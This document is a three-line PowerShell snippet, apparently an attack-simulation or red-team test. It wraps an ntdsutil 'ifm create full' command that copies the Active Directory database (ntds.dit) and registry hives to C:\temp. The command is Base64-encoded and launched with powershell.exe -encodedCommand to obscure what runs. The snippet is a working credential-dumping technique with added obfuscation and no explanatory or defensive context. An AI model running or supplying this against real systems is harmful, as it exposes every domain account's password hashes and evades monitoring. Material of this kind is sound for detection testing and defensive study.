$command='ntdsutil "activate instance ntds" ifm "create full C:\temp\ntdsutil" quit quit'
$encoded=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -encodedCommand $encoded
